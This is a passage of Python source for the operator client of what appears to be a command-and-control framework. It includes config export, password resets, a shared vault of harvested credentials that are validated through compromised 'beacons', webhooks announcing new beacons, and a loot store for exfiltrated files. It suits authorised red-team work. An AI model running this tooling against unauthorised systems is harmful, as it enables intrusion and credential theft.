                    _ssl.PEM_cert_to_DER_cert(pem)).hexdigest()
            except Exception:
                return '?'
        ca_fp = _fp(cfg_obj.get('ca_pem', ''))
        cert_fp = _fp(cfg_obj.get('client_cert', ''))
        my_ca_fp = _fp(self.cfg.get('ca_pem', ''))

        c = CLR
        print()
        print(f"  {c['dim']}server ca (this session):{c['reset']} "
              f"{my_ca_fp}")
        print(f"  {c['dim']}config ca (new file)    :{c['reset']} "
              f"{ca_fp}")
        if ca_fp != '?' and my_ca_fp != '?':
            if ca_fp == my_ca_fp:
                print(f"  {c['green']}✓ match{c['reset']}")
            else:
                print(f"  {c['red']}✗ mismatch — the new config "
                      f"will not authenticate against the running "
                      f"server{c['reset']}")
        print()

        if ca_fp != '?' and my_ca_fp != '?' and ca_fp != my_ca_fp:
            problems.append(
                f"the exported CA fingerprint {ca_fp} does "
                f"not match the CA this session trusts "
                f"({my_ca_fp}). The server's team_ca/ was "
                f"regenerated while the handler was running, or "
                f"the running handler is reading a different "
                f"team_ca/ than the one your session "
                f"authenticated against. A client using this "
                f"config will fail at connect time with "
                f"TLSV1_ALERT_UNKNOWN_CA. Restart the handler "
                f"from the same directory, then re-run "
                f"`operators export {name}`.")

        if problems:
            print()
            print(f"{CLR['red']}{CLR['bold']}this config is not "
                  f"internally consistent:{CLR['reset']}")
            for p in problems:
                print(f"  {CLR['red']}✗{CLR['reset']} {p}")
            print()
            print(f"  {CLR['yellow']}Writing the file anyway would "
                  f"produce a config that fails at connect time "
                  f"with TLSV1_ALERT_UNKNOWN_CA.{CLR['reset']}")
            print()
            if not sys.stdin.isatty():
                print(f"{CLR['red']}stdin is not a terminal; "
                      f"refusing to write an inconsistent "
                      f"config.{CLR['reset']}")
                return
            try:
                ans = input(
                    f"  {CLR['yellow']}Write it anyway? [y/N]"
                    f"{CLR['reset']} "
                ).strip().lower()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if ans not in ('y', 'yes'):
                print(f"{CLR['dim']}cancelled — no file written"
                      f"{CLR['reset']}")
                return
            print()

        try:
            parent = os.path.dirname(out_path)
            if parent:
                os.makedirs(parent, exist_ok=True)
            with open(out_path, 'wb') as fh:
                fh.write(raw)
            try:
                os.chmod(out_path, 0o600)
            except OSError:
                pass
        except OSError as exc:
            print(f"{CLR['red']}write failed: {exc}{CLR['reset']}")
            return

        size = len(raw)
        self_user = (name == self.name)
        print(f"{CLR['green']}✓{CLR['reset']} exported config for "
              f"{CLR['cyan']}{name}{CLR['reset']} "
              f"({size} bytes)")
        print(f"  {CLR['dim']}path: {CLR['reset']}{out_path}")
        print(f"  {CLR['dim']}role: {CLR['reset']}"
              f"{r.get('role', '?')}")
        print(f"  {CLR['dim']}config sha256 : {CLR['reset']}"
              f"{got_sha}")
        print(f"  {CLR['dim']}ca fingerprint: {CLR['reset']}"
              f"{ca_fp}")
        print(f"  {CLR['dim']}cert fingerprint: {CLR['reset']}"
              f"{cert_fp}")
        if not self_user:
            print(f"{CLR['yellow']}⚠  This is a credential for "
                  f"another operator. Anyone who reads this file "
                  f"can act as {name}.{CLR['reset']}")
            print(f"{CLR['yellow']}   Hand it off out of band — "
                  f"never over the C2 channel, chat, or plain "
                  f"email.{CLR['reset']}")

    def _write_self_config(self, cfg_b64, expected_sha):
        """Write a config blob returned by the server to this
        client's own config path, atomically.

        The blob is base64 JSON. The server's SHA-256 is verified
        before writing, so a corrupted response cannot leave the
        operator with an unparseable config. The write goes to a
        sibling temp file, fsync, then ``os.replace`` over the
        target — the on-disk file is either the old config or the
        new one, never a partial write. The old config is
        preserved as ``<path>.bak``.

        Returns True on success.
        """
        if not self.config_path:
            print(f"{CLR['yellow']}no config path on record; "
                  f"the new config was not written{CLR['reset']}")
            return False

        try:
            raw = _b64.b64decode(cfg_b64)
        except Exception as exc:
            print(f"{CLR['red']}config decode failed: {exc}"
                  f"{CLR['reset']}")
            return False

        if expected_sha:
            got = hashlib.sha256(raw).hexdigest()
            if got != expected_sha:
                print(f"{CLR['red']}config sha256 mismatch — "
                      f"refusing to overwrite{CLR['reset']}")
                print(f"  expected: {expected_sha}")
                print(f"  got:      {got}")
                return False

        # ---- Parse and verify the bundle before it lands on disk ----
        try:
            import json as _json
            cfg_obj = _json.loads(raw.decode('utf-8'))
        except Exception as exc:
            print(f"{CLR['red']}bundled config is not valid JSON: "
                  f"{exc} — refusing to overwrite{CLR['reset']}")
            return False

        problems = self._verify_export_bundle(cfg_obj)

        import ssl as _ssl_fp
        def _fp(pem):
            try:
                return hashlib.sha256(
                    _ssl_fp.PEM_cert_to_DER_cert(pem)).hexdigest()
            except Exception:
                return '?'
        cfg_ca_fp = _fp(cfg_obj.get('ca_pem', ''))
        sess_ca_fp = _fp(self.cfg.get('ca_pem', ''))
        if cfg_ca_fp != '?' and sess_ca_fp != '?' \
                and cfg_ca_fp != sess_ca_fp:
            problems.append(
                f'the bundled CA fingerprint {cfg_ca_fp} does not '
                f'match the CA this session trusts ({sess_ca_fp}); '
                f'the server\'s team_ca/ was regenerated while the '
                f'handler was running')

        if problems:
            print(f"{CLR['red']}{CLR['bold']}bundled config is not "
                  f"internally consistent — refusing to overwrite"
                  f"{CLR['reset']}")
            for p in problems:
                print(f"  {CLR['red']}✗{CLR['reset']} {p}")
            print(f"  {CLR['yellow']}your existing config is "
                  f"untouched. Report this to an admin — the "
                  f"server needs to be restarted and the config "
                  f"re-minted.{CLR['reset']}")
            return False

        target = os.path.abspath(os.path.expanduser(self.config_path))
        dirname = os.path.dirname(target) or '.'
        try:
            os.makedirs(dirname, exist_ok=True)
        except OSError:
            pass

        if os.path.isfile(target):
            try:
                import shutil as _sh
                _sh.copy2(target, target + '.bak')
            except OSError:
                pass

        tmp = target + '.new'
        try:
            with open(tmp, 'wb') as fh:
                fh.write(raw)
                try:
                    fh.flush()
                    os.fsync(fh.fileno())
                except OSError:
                    pass
            os.replace(tmp, target)
            try:
                os.chmod(target, 0o600)
            except OSError:
                pass
        except OSError as exc:
            print(f"{CLR['red']}config write failed: {exc}"
                  f"{CLR['reset']}")
            try:
                os.unlink(tmp)
            except OSError:
                pass
            return False

        print(f"{CLR['green']}✓{CLR['reset']} config rewritten: "
              f"{CLR['cyan']}{target}{CLR['reset']}")
        print(f"  {CLR['dim']}previous file preserved as "
              f"{target}.bak{CLR['reset']}")
        return True

    def _cmd_operators_passwd(self, parts):
        """operators passwd [<name>]

        Reset a password. Without a name, resets your own.
        Resetting another operator requires admin; resetting
        another admin is refused remotely by design and must be
        done from the local console on the team server machine.

        An empty password clears the second factor entirely —
        the operator reverts to cert-only auth. Useful when a
        password is suspected leaked and you want to remove the
        factor rather than rotate it.

        After a change, re-export the config: the derivation may
        have moved from PBKDF2 to scrypt, and the client needs
        the new parameters to derive the same key the server
        stored.
        """
        target = parts[2] if len(parts) > 2 else None
        label = target or self.name

        import getpass
        print(f"  {CLR['dim']}New password for {label}. Leave "
              f"blank to clear the second factor (cert-only "
              f"auth).{CLR['reset']}")
        try:
            pw1 = getpass.getpass(
                f"  {CLR['green']}New password "
                f"(blank = clear){CLR['reset']}: ")
            if pw1:
                pw2 = getpass.getpass(
                    f"  {CLR['green']}Confirm{CLR['reset']}: ")
                if pw1 != pw2:
                    print(f"{CLR['red']}passwords do not match"
                          f"{CLR['reset']}")
                    return
        except (EOFError, KeyboardInterrupt):
            print()
            print(f"{CLR['cyan']}cancelled{CLR['reset']}")
            return

        payload = {'password': pw1}
        if target:
            payload['name'] = target

        try:
            r = self.tp.post(
                '/api/v1/operators/passwd', payload)
        except Exception as exc:
            print(f"{CLR['red']}passwd failed: {exc}"
                  f"{CLR['reset']}")
            return

        if not r.get('ok'):
            print(f"{CLR['red']}{r.get('error', 'failed')}"
                  f"{CLR['reset']}")
            return

        changed = r.get('name', label)
        cfg_b64 = r.get('config_b64')
        cfg_sha = r.get('config_sha256', '')

        if pw1:
            print(f"{CLR['green']}✓ password updated for "
                  f"{changed}{CLR['reset']}")

            if changed == self.name:
                if cfg_b64:
                    wrote = self._write_self_config(cfg_b64, cfg_sha)
                    if wrote:
                        print(f"  {CLR['yellow']}your session "
                              f"key is now stale — restart the "
                              f"client with the same config path "
                              f"and enter the new password."
                              f"{CLR['reset']}")
                        raise _RestartRequired
                    print(f"  {CLR['red']}could not rewrite the "
                          f"config in place — the reason was "
                          f"printed above. Falling back to a "
                          f"manual re-export.{CLR['reset']}")
                else:
                    print(f"  {CLR['dim']}the server did not "
                          f"bundle a fresh config with this "
                          f"response.{CLR['reset']}")
                print(f"  {CLR['yellow']}your session key is "
                      f"stale. Re-export the config on the "
                      f"server (`operators export`) and restart "
                      f"the client.{CLR['reset']}")
            else:
                print(f"  {CLR['yellow']}Hand the new password "
                      f"to {changed} out of band — not over the "
                      f"C2 channel, not over chat.{CLR['reset']}")
                print(f"  {CLR['dim']}Re-export their config: "
                      f"`operators export {changed}` — the "
                      f"derivation may have moved to scrypt."
                      f"{CLR['reset']}")
        else:
            print(f"{CLR['green']}✓ password cleared for "
                  f"{changed} (cert-only){CLR['reset']}")
            if changed == self.name:
                if cfg_b64:
                    self._write_self_config(cfg_b64, cfg_sha)
                    print(f"  {CLR['dim']}you may continue in "
                          f"this session; the config file now "
                          f"reflects cert-only auth.{CLR['reset']}")
            else:
                print(f"  {CLR['dim']}Re-export their config: "
                      f"`operators export {changed}`."
                      f"{CLR['reset']}")


    # ------------------------------------------------------------------
    # Operator-console features: creds / notes / webhooks

    def _parse_flags(self, args, flag_map):
        """Very small `--flag value` parser.

        `flag_map` maps a flag string to the key it should be
        stored under. Unknown tokens are skipped; a flag with no
        following value is skipped. Used by `creds add`,
        `webhooks add`, and anything else that wants the shape.
        """
        out = {}
        i = 0
        while i < len(args):
            a = args[i]
            if a in flag_map and i + 1 < len(args):
                out[flag_map[a]] = args[i + 1]
                i += 2
            else:
                i += 1
        return out

    def _cmd_creds(self, parts):
        """creds list | get <id> | add [...] | search <term>
                | validate <id> [--from <beacon>] [--target <host>]
                | delete <id>

        The credential vault is engagement-wide and shared
        between operators. Credential values are never written
        to the audit chain; only the record id, user, domain,
        kind, and source beacon are recorded.
        """
        c = CLR
        if 'creds.use' not in self.caps:
            print(f"{c['red']}your role does not include "
                  f"creds.use{c['reset']}")
            return
        sub = parts[1].lower() if len(parts) > 1 else 'list'

        if sub in ('list', 'ls'):
            try:
                r = self.tp.post('/api/v1/creds/list', {})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            rows = r.get('creds') or []
            if not rows:
                print(f"  {c['dim']}(credential vault is empty)"
                      f"{c['reset']}")
                return
            _header(f'CREDENTIALS  ·  {len(rows)}')
            for e in rows:
                who = e.get('user') or '?'
                dom = e.get('domain') or ''
                full = f"{dom}\\{who}" if dom else who
                kind = e.get('kind', '?')
                cid = e.get('id', '?')
                src = e.get('source_beacon') or 0
                when = time.strftime(
                    '%Y-%m-%d %H:%M',
                    time.localtime(e.get('found_at', 0)))
                vstatus = e.get('validation_status',
                                'unvalidated')
                vcolor = {
                    'valid':    c['green'],
                    'invalid':  c['red'],
                    'locked':   c['yellow'],
                    'expired':  c['yellow'],
                    'error':    c['red'],
                }.get(vstatus, c['dim'])
                vbadge = f"{vcolor}{vstatus:<11}{c['reset']}"
                print(f"  {c['cyan']}#{cid[:8]}{c['reset']}  "
                      f"{full:<28} "
                      f"{kind:<10} {vbadge} "
                      f"{c['dim']}src=#{src}  {when}"
                      f"{c['reset']}")
            return

        if sub in ('get', 'show'):
            if len(parts) < 3:
                print(f"{c['red']}usage: creds get <id>"
                      f"{c['reset']}")
                return
            try:
                r = self.tp.post(
                    '/api/v1/creds/get', {'id': parts[2]})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            if not r.get('ok'):
                print(f"{c['red']}"
                      f"{r.get('error', 'not found')}"
                      f"{c['reset']}")
                return
            e = r['cred']
            for k in ('id', 'user', 'domain', 'kind', 'value',
                      'source_beacon', 'source_path',
                      'found_by', 'found_at'):
                v = e.get(k, '')
                if k == 'found_at' and v:
                    v = time.strftime(
                        '%Y-%m-%d %H:%M:%S',
                        time.localtime(v))
                print(f"  {c['dim']}{k:<15}{c['reset']}{v}")

            vstatus = e.get('validation_status', 'unvalidated')
            if vstatus != 'unvalidated':
                vcolor = {
                    'valid':    c['green'],
                    'invalid':  c['red'],
                    'locked':   c['yellow'],
                    'expired':  c['yellow'],
                    'error':    c['red'],
                }.get(vstatus, c['yellow'])
                when = e.get('validated_at') or 0
                when_s = time.strftime(
                    '%Y-%m-%d %H:%M:%S',
                    time.localtime(when)) if when else '?'
                from_b = e.get('validated_from') or 0
                by = e.get('validated_by') or '?'
                print(f"  {c['dim']}{'validation':<15}{c['reset']}"
                      f"{vcolor}{vstatus}{c['reset']}  "
                      f"{c['dim']}by {by}, #{from_b}, "
                      f"{when_s}{c['reset']}")
                detail = e.get('validation_detail') or ''
                if detail:
                    print(f"  {c['dim']}{'':<15}{c['reset']}"
                          f"{c['dim']}{detail}{c['reset']}")

            used = e.get('used_by') or []
            if used:
                print(f"  {c['dim']}used_by{c['reset']} "
                      f"({len(used)} uses)")
                for u in used[-5:]:
                    print(f"    {c['dim']}#{u['beacon']} "
                          f"{u['verb']} "
                          f"{time.strftime('%H:%M', time.localtime(u['ts']))}"
                          f"{c['reset']}")
            return

        if sub == 'add':
            opts = self._parse_flags(parts[2:], {
                '--user': 'user', '--domain': 'domain',
                '--kind': 'kind', '--value': 'value',
                '--source': 'source_beacon',
                '--path': 'source_path',
            })
            payload = {
                'user':          opts.get('user', ''),
                'domain':        opts.get('domain', ''),
                'kind':          opts.get('kind', 'plaintext'),
                'value':         opts.get('value', ''),
                'source_beacon': opts.get('source_beacon', 0),
                'source_path':   opts.get('source_path', ''),
            }
            if not payload['user'] or not payload['value']:
                usage = (
                    "usage: creds add "
                    "--user <user> --value <value> "
                    "[--domain <domain>] [--kind <kind>] "
                    "[--source <beacon-id>] [--path <path>]")
                missing = []
                if not payload['user']:
                    missing.append('--user <user>')
                if not payload['value']:
                    missing.append('--value <value>')
                print(f"{c['red']}{usage}{c['reset']}")
                print(f"  {c['yellow']}missing: "
                      f"{', '.join(missing)}{c['reset']}")
                print(f"  {c['dim']}prefix the command with a "
                      f"space on a shell that honours "
                      f"HISTCONTROL=ignorespace to keep the "
                      f"value out of shell history."
                      f"{c['reset']}")
                return
            if payload['source_beacon'] in ('', '0', 0):
                payload['source_beacon'] = (
                    self.current_beacon or 0)
            try:
                r = self.tp.post('/api/v1/creds/add', payload)
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            if not r.get('ok'):
                print(f"{c['red']}"
                      f"{r.get('error', 'failed')}"
                      f"{c['reset']}")
                return
            print(f"{c['green']}✓{c['reset']} stored as "
                  f"{c['cyan']}#{r['id'][:8]}{c['reset']}")
            return

        if sub == 'search':
            if len(parts) < 3:
                print(f"{c['red']}usage: creds search <term>"
                      f"{c['reset']}")
                return
            try:
                r = self.tp.post(
                    '/api/v1/creds/search', {'term': parts[2]})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            rows = r.get('creds') or []
            _header(f'SEARCH  ·  {len(rows)} match(es)')
            for e in rows:
                cid = e.get('id', '?')
                who = e.get('user') or '?'
                dom = e.get('domain') or ''
                full = f"{dom}\\{who}" if dom else who
                print(f"  {c['cyan']}#{cid[:8]}{c['reset']}  "
                      f"{full:<28} {e.get('kind', '?')}")
            return

        if sub == 'validate':
            if len(parts) < 3:
                print(f"{c['red']}usage: creds validate <id> "
                      f"[--from <beacon-id>] [--target <host>]"
                      f"{c['reset']}")
                return
            self._cmd_creds_validate(parts[2], parts[3:])
            return

        if sub in ('delete', 'del', 'rm'):
            if len(parts) < 3:
                print(f"{c['red']}usage: creds delete <id>"
                      f"{c['reset']}")
                return
            try:
                r = self.tp.post(
                    '/api/v1/creds/delete', {'id': parts[2]})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            if not r.get('ok'):
                print(f"{c['red']}"
                      f"{r.get('error', 'failed')}"
                      f"{c['reset']}")
                return
            print(f"{c['green']}✓{c['reset']} deleted "
                  f"#{parts[2][:8]}")
            return

        print(f"{c['red']}usage: creds "
              f"<list|get|add|search|validate|delete>{c['reset']}")

    def _cmd_creds_validate(self, cid, opts):
        """Run a validation check against a stored credential.

        The check itself runs on a beacon, not on the team
        server. This method decides *which* beacon to use, sends
        the task, parses the beacon's result, and records the
        outcome via the vault API.

        Beacon selection, in order:

          1. --from <beacon-id>, if given.
          2. The entry's source_beacon, if it is still alive.
          3. The currently attached beacon, if any.
          4. Refuse with a specific error naming the missing
             information.

        The operator can override the target host with --target
        when the credential's domain controller is not the same
        as the source host. Without --target, the check targets
        the credential's domain, which the beacon resolves to a
        DC the same way a login would.
        """
        c = CLR

        try:
            r = self.tp.post('/api/v1/creds/get', {'id': cid})
        except Exception as exc:
            print(f"{c['red']}{exc}{c['reset']}")
            return
        if not r.get('ok'):
            print(f"{c['red']}"
                  f"{r.get('error', 'not found')}{c['reset']}")
            return
        entry = r['cred']
        kind = (entry.get('kind') or '').lower()

        # Parse the flags.
        from_beacon = None
        target = ''
        i = 0
        while i < len(opts):
            a = opts[i]
            if a == '--from' and i + 1 < len(opts):
                try:
                    from_beacon = int(opts[i + 1])
                except ValueError:
                    print(f"{c['red']}--from must be a beacon id"
                          f"{c['reset']}")
                    return
                i += 2
            elif a == '--target' and i + 1 < len(opts):
                target = opts[i + 1]
                i += 2
            else:
                print(f"{c['red']}unknown flag: {a}{c['reset']}")
                return

        if kind not in _CLIENT_VALIDATABLE:
            print(f"{c['yellow']}kind {kind!r} has no validation "
                  f"routine{c['reset']}")
            print(f"  {c['dim']}validatable kinds: "
                  f"{', '.join(sorted(_CLIENT_VALIDATABLE))}"
                  f"{c['reset']}")
            return

        if from_beacon is None:
            # Fall back to the source beacon if it is still live.
            src = int(entry.get('source_beacon') or 0)
            if src:
                for b in getattr(self, '_beacon_cache', []):
                    if b.get('id') == src and b.get('alive'):
                        from_beacon = src
                        break
            if from_beacon is None and self.current_beacon:
                from_beacon = self.current_beacon
            if from_beacon is None:
                print(f"{c['red']}no beacon available to run the "
                      f"check{c['reset']}")
                print(f"  {c['dim']}the source beacon is stale and "
                      f"no beacon is currently attached. Attach "
                      f"with `use <id>`, or pass --from <id>."
                      f"{c['reset']}")
                return

        target_os = None
        for b in getattr(self, '_beacon_cache', []):
            if b.get('id') == from_beacon:
                target_os = b.get('os')
                break

        print(f"{c['cyan']}[*]{c['reset']} validating "
              f"{c['cyan']}#{cid[:8]}{c['reset']} "
              f"({kind}) from beacon "
              f"{c['cyan']}#{from_beacon}{c['reset']}"
              f"{' on ' + target_os if target_os else ''}")

        args = [
            kind,
            entry.get('user', ''),
            entry.get('domain', ''),
            _b64.b64encode(
                (entry.get('value') or '').encode('utf-8')
            ).decode('ascii'),
            target,
        ]

        saved = self.current_beacon
        self.current_beacon = from_beacon
        try:
            out, err, code = self._send_and_wait(
                'cred_validate', args, timeout=120)
        finally:
            self.current_beacon = saved

        if err is not None:
            print(f"{c['red']}check failed: {err}{c['reset']}")
            try:
                self.tp.post('/api/v1/creds/validate', {
                    'id':          cid,
                    'status':      'error',
                    'detail':      str(err)[:512],
                    'from_beacon': from_beacon,
                })
            except Exception:
                pass
            return

        text = (out or b'').decode('utf-8',
                                   errors='replace').strip()
        try:
            result = json.loads(text)
            status = str(result.get('status', 'error')).lower()
            detail = str(result.get('detail', ''))
        except Exception:
            status = 'error'
            detail = text or 'unparseable response from beacon'

        if status not in _CLIENT_VALIDATION_STATUSES:
            status = 'error'

        try:
            self.tp.post('/api/v1/creds/validate', {
                'id':          cid,
                'status':      status,
                'detail':      detail[:512],
                'from_beacon': from_beacon,
            })
        except Exception as exc:
            print(f"{c['red']}could not record result: {exc}"
                  f"{c['reset']}")
            detail = detail + ' (unrecorded)'

        color = {
            'valid':       c['green'],
            'invalid':     c['red'],
            'locked':      c['yellow'],
            'expired':     c['yellow'],
            'error':       c['red'],
            'unsupported': c['dim'],
        }.get(status, c['yellow'])

        print(f"{color}✓ {status}{c['reset']}  "
              f"{c['dim']}from #{from_beacon}{c['reset']}")
        if detail:
            for line in detail.splitlines():
                print(f"  {c['dim']}{line}{c['reset']}")

    def _cmd_notes(self, parts):
        """notes [<text>] | notes search <term>

        Engagement-wide notes. Shared across every operator.
        Per-beacon notes live behind the `note` verb inside a
        beacon session.
        """
        c = CLR
        if 'notes.use' not in self.caps:
            print(f"{c['red']}your role does not include "
                  f"notes.use{c['reset']}")
            return
        if len(parts) == 1:
            try:
                r = self.tp.post(
                    '/api/v1/notes', {'op': 'list'})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            notes = r.get('notes') or []
            if not notes:
                print(f"  {c['dim']}(no engagement notes)"
                      f"{c['reset']}")
                return
            _header(f'NOTES  ·  {len(notes)}')
            for n in notes:
                ts = time.strftime(
                    '%Y-%m-%d %H:%M',
                    time.localtime(n.get('ts', 0)))
                tags = ', '.join(n.get('tags') or [])
                print(f"  {c['dim']}{ts}  "
                      f"{n.get('author', '?'):<12}"
                      f"{c['reset']}{n.get('text', '')}")
                if tags:
                    print(f"    {c['dim']}[{tags}]{c['reset']}")
            return
        if parts[1].lower() == 'search':
            if len(parts) < 3:
                print(f"{c['red']}usage: notes search <term>"
                      f"{c['reset']}")
                return
            try:
                r = self.tp.post(
                    '/api/v1/notes',
                    {'op': 'search', 'term': parts[2]})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            for n in (r.get('notes') or []):
                ts = time.strftime(
                    '%Y-%m-%d %H:%M',
                    time.localtime(n.get('ts', 0)))
                print(f"  {c['dim']}{ts}  "
                      f"{n.get('author', '?'):<12}"
                      f"{c['reset']}{n.get('text', '')}")
            return
        text = ' '.join(parts[1:]).strip()
        try:
            r = self.tp.post(
                '/api/v1/notes',
                {'op': 'add', 'text': text})
        except Exception as exc:
            print(f"{c['red']}{exc}{c['reset']}")
            return
        if r.get('ok'):
            print(f"{c['green']}✓{c['reset']} note stored")
        else:
            print(f"{c['red']}{r.get('error', 'failed')}"
                  f"{c['reset']}")

    def _cmd_webhooks(self, parts):
        """webhooks list | add ... | remove <id> | test <id>"""
        c = CLR
        if 'webhooks.manage' not in self.caps:
            print(f"{c['red']}your role does not include "
                  f"webhooks.manage{c['reset']}")
            return
        sub = parts[1].lower() if len(parts) > 1 else 'list'

        if sub in ('list', 'ls'):
            try:
                r = self.tp.post('/api/v1/webhooks', {})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            rows = r.get('webhooks') or []
            if not rows:
                print(f"  {c['dim']}(no webhooks){c['reset']}")
                return
            _header(f'WEBHOOKS  ·  {len(rows)}')
            for h in rows:
                print(f"  {c['cyan']}#{h['id']}{c['reset']}  "
                      f"{h.get('name', '?'):<16} "
                      f"{h.get('kind'):<10} "
                      f"{c['dim']}"
                      f"{', '.join(h.get('events', []))}"
                      f"{c['reset']}")
            return

        if sub == 'add':
            args = parts[2:]
            opts = self._parse_flags(args, {
                '--name': 'name',
                '--kind': 'kind',
                '--url': 'url',
                '--events': 'events',
                '--chat': 'chat_id',
            })

            if not opts.get('url'):
                for a in args:
                    if a.startswith('https://'):
                        opts['url'] = a
                        break

            if not opts.get('url'):
                print(f"{c['red']}usage: webhooks add "
                      f"<https://url> "
                      f"[--kind slack|discord|telegram] "
                      f"[--events new-beacon,...] "
                      f"[--name <name>] "
                      f"[--chat <chat_id>]{c['reset']}")
                print(f"  {c['dim']}the URL must start with "
                      f"https://; the server refuses plaintext "
                      f"endpoints. Telegram hooks additionally "
                      f"require --chat <chat_id>.{c['reset']}")
                return

            kind = opts.get('kind', 'slack').lower()
            events = [e.strip() for e in
                      (opts.get('events') or 'new-beacon')
                      .split(',') if e.strip()]
            try:
                r = self.tp.post(
                    '/api/v1/webhooks/add', {
                        'name':   opts.get('name', kind),
                        'kind':   kind,
                        'url':    opts['url'],
                        'events': events,
                        'chat_id': opts.get('chat_id', ''),
                    })
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            if not r.get('ok'):
                print(f"{c['red']}"
                      f"{r.get('error', 'failed')}"
                      f"{c['reset']}")
                return
            print(f"{c['green']}✓{c['reset']} added "
                  f"{c['cyan']}#{r['id']}{c['reset']} "
                  f"({kind})")
            return

        if sub in ('remove', 'rm'):
            if len(parts) < 3:
                print(f"{c['red']}usage: webhooks remove <id>"
                      f"{c['reset']}")
                return
            try:
                r = self.tp.post(
                    '/api/v1/webhooks/remove',
                    {'id': parts[2]})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            if r.get('ok'):
                print(f"{c['green']}✓{c['reset']} removed "
                      f"#{parts[2]}")
            else:
                print(f"{c['red']}"
                      f"{r.get('error', 'failed')}"
                      f"{c['reset']}")
            return

        if sub == 'test':
            if len(parts) < 3:
                print(f"{c['red']}usage: webhooks test <id>"
                      f"{c['reset']}")
                return
            try:
                r = self.tp.post(
                    '/api/v1/webhooks/test',
                    {'id': parts[2]})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            if r.get('ok'):
                print(f"{c['green']}✓{c['reset']} test posted")
            else:
                print(f"{c['red']}"
                      f"{r.get('error', 'failed')}"
                      f"{c['reset']}")
            return

        print(f"{c['red']}usage: webhooks "
              f"<list|add|remove|test>{c['reset']}")

    def _read_multiline(self,
                        header='[paste mode: end with "." on its own line]\n'):
        """Read multi-line input until a line containing only '.'
        terminates. Returns the accumulated string, or None on
        Ctrl-C or EOF. Used by `--stdin` variants of the script
        verbs and of `sh`."""
        print(f"{CLR['dim']}{header}{CLR['reset']}",
              end='', flush=True)
        lines = []
        while True:
            try:
                line = input('  | ')
            except (EOFError, KeyboardInterrupt):
                print()
                return None
            if line.strip() == '.':
                return '\n'.join(lines)
            lines.append(line)


    # ------------------------------------------------------------------
    # Loot store

    def _cmd_loot(self, parts):
        """loot [list | get <sha256> [<path>]
                | upload <local_path> [<display_name>]
                | delete <sha256>]

        The loot store is filled automatically by `download` — every
        verified beacon download is pushed to the server under its
        SHA-256, along with the source path and beacon it came from.
        Any operator with loot.use can retrieve a file by hash.

        `upload` pushes a file that already exists on the operator's
        machine into the shared store under its own SHA-256. It is
        the only sub-verb that does not involve a beacon.
        """
        c = CLR
        if 'loot.use' not in self.caps:
            print(f"{c['red']}your role does not include loot.use"
                  f"{c['reset']}")
            return
        sub = parts[1].lower() if len(parts) > 1 else 'list'

        if sub in ('list', 'ls'):
            self._loot_list()
            return

        if sub in ('upload', 'up', 'put'):
            if len(parts) < 3:
                print(f"{c['red']}usage: lootstore upload "
                      f"<local_path> [<display_name>]"
                      f"{c['reset']}")
                return
            self._loot_upload_local(
                parts[2],
                parts[3] if len(parts) > 3 else None)
            return

        if sub in ('get', 'download'):
            if len(parts) < 3:
                print(f"{c['red']}usage: loot get <sha256> "
                      f"[<path>]{c['reset']}")
                return
            digest = parts[2].lower().strip()
            out_path = parts[3] if len(parts) > 3 else None
            self._loot_get(digest, out_path)
            return

        if sub in ('delete', 'del', 'rm'):
            if len(parts) < 3:
                print(f"{c['red']}usage: loot delete <sha256>"
                      f"{c['reset']}")
                return
            self._loot_delete(parts[2].lower().strip())
            return

        if sub in ('help', '?'):
            print(f"loot list")
            print(f"loot get <sha256> [<path>]")
            print(f"loot upload <local_path> [<display_name>]")
            print(f"loot delete <sha256>")
            print(f"  {c['dim']}upload pushes a local file into "
                  f"the shared store under its SHA-256. The "
                  f"display_name defaults to the file's "
                  f"basename; pass a second argument to override "
                  f"it. delete removes loot you uploaded — "
                  f"admins can delete any operator's loot and "
                  f"orphans with no recorded owner. The audit "
                  f"chain records every deletion, including "
                  f"admin overrides.{c['reset']}")
            return

        print(f"{c['red']}unknown loot subcommand: {sub}"
              f"{c['reset']}")

    def _loot_upload_local(self, local_path, display_name=None):
        """Push a local file into the shared loot store.

        Unlike `download`, which pushes a file retrieved from a
        beacon, this command takes a file that already exists on
        the operator's machine and registers it in the shared
        store under its SHA-256. Useful for staging a tool that
        another operator will pull by hash, or for preserving a
        file acquired out of band.

        The path the file came from on the operator's machine is
        not recorded as `source_path` — that field means "path
        on the target" and a local file does not have one. The
        display name defaults to the file's basename and can be
        overridden with the second argument.

        Delegates the actual transfer to `_loot_store_upload`,
        which picks the single-POST or chunked path by size.
        """
        c = CLR
        if not os.path.isfile(local_path):
            print(f"{c['red']}local file not found: {local_path}"
                  f"{c['reset']}")
            return
        try:
            size = os.path.getsize(local_path)
        except OSError as exc:
            print(f"{c['red']}stat failed: {exc}{c['reset']}")
            return
        if size == 0:
            print(f"{c['red']}file is empty{c['reset']}")
            return

        print(f"{c['cyan']}[*]{c['reset']} hashing "
              f"{local_path} ({_human_bytes(size)})")
        h = hashlib.sha256()
        try:
            with open(local_path, 'rb') as fh:
                for block in iter(
                        lambda: fh.read(1024 * 1024), b''):
                    h.update(block)
        except OSError as exc:
            print(f"{c['red']}read error: {exc}{c['reset']}")
            return
        digest = h.hexdigest()
        print(f"{c['dim']}    sha256: {digest}{c['reset']}")

        self._loot_store_upload(
            local_path, '', digest,
            display_name=display_name)

    def _loot_list(self):
        c = CLR
        try:
            r = self.tp.post('/api/v1/loot/list', {},
                             timeout=30.0)
        except Exception as exc:
            print(f"{c['red']}loot list failed: {exc}{c['reset']}")
            return
        rows = r.get('files') or []
        if not rows:
            print(f"  {c['dim']}(loot store is empty){c['reset']}")
            return
        _header(f'LOOT  ·  {len(rows)} file(s)')
        for f in rows:
            h = f.get('sha256', '')
            nm = f.get('name', '') or '?'
            sz = _human_bytes(int(f.get('size', 0)))
            owner = f.get('owner', '?')
            ts = f.get('ts', 0)
